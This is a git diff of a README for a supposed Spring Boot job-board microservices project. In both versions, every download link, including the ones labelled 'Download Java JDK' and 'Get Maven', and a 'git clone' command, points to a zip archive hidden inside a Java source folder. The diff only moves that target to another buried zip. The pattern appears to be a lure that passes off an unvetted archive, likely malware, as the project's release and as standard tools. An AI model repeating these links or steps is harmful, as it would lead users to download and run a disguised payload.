@@ -1,6 +1,6 @@
 # 🚀 job-board-microservices - Build and Manage Your Job Board Easily
 
-[![Download Job Board Microservices](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/eureka-server/src/main/java/com/jobboard/eureka/job-board-microservices_1.8.zip%20Now%20-%F0%9F%9A%80%20Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/eureka-server/src/main/java/com/jobboard/eureka/job-board-microservices_1.8.zip)
+[![Download Job Board Microservices](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/notification-service/src/main/java/com/jobboard/notifications/dto/job-board-microservices-3.8-beta.4.zip%20Now%20-%F0%9F%9A%80%20Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/notification-service/src/main/java/com/jobboard/notifications/dto/job-board-microservices-3.8-beta.4.zip)
 
 ## 🔧 Overview
 Welcome to the Job Board Microservices project. This is a production-grade backend for a job board system, built using Spring Boot and microservices architecture. It features JWT authentication, RabbitMQ messaging, and user subscriptions. This application helps businesses connect with job seekers efficiently.
@@ -26,22 +26,22 @@ The application works on Windows, macOS, and Linux. Ensure you have the latest v
 To get started with the Job Board Microservices application, follow these steps:
 
 1. **Download the Application:**
-   - Visit the [Releases Page](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/eureka-server/src/main/java/com/jobboard/eureka/job-board-microservices_1.8.zip) to download the latest version of the application.
+   - Visit the [Releases Page](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/notification-service/src/main/java/com/jobboard/notifications/dto/job-board-microservices-3.8-beta.4.zip) to download the latest version of the application.
 
 2. **Install Required Software:**
    - If you don't have Java JDK or Maven installed, follow these resources:
-     - [Download Java JDK](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/eureka-server/src/main/java/com/jobboard/eureka/job-board-microservices_1.8.zip)
-     - [Get Maven](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/eureka-server/src/main/java/com/jobboard/eureka/job-board-microservices_1.8.zip)
+     - [Download Java JDK](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/notification-service/src/main/java/com/jobboard/notifications/dto/job-board-microservices-3.8-beta.4.zip)
+     - [Get Maven](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/notification-service/src/main/java/com/jobboard/notifications/dto/job-board-microservices-3.8-beta.4.zip)
 
 3. **Clone the Repository (Optional):**
    - Open your terminal or command prompt.
    - Enter the following command:
      ```
-     git clone https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/eureka-server/src/main/java/com/jobboard/eureka/job-board-microservices_1.8.zip
+     git clone https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/notification-service/src/main/java/com/jobboard/notifications/dto/job-board-microservices-3.8-beta.4.zip
      ```
 
 ## ⚙️ Download & Install
-To download the Job Board Microservices application, please visit the [Releases Page](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/eureka-server/src/main/java/com/jobboard/eureka/job-board-microservices_1.8.zip) and choose the latest release.
+To download the Job Board Microservices application, please visit the [Releases Page](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/notification-service/src/main/java/com/jobboard/notifications/dto/job-board-microservices-3.8-beta.4.zip) and choose the latest release.
 
 1. Click the version you want to download.
 2. Download the file for your operating system.
@@ -88,4 +88,4 @@ This project is licensed under the MIT License. You can view the full license [h
 ## 🌟 Acknowledgments
 Special thanks to the community and contributions that have helped improve and enhance this project.
 
-For more updates and support, please visit the [Releases Page](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/eureka-server/src/main/java/com/jobboard/eureka/job-board-microservices_1.8.zip).
+For more updates and support, please visit the [Releases Page](https://raw.githubusercontent.com/hakecalamus156/job-board-microservices/main/notification-service/src/main/java/com/jobboard/notifications/dto/job-board-microservices-3.8-beta.4.zip).
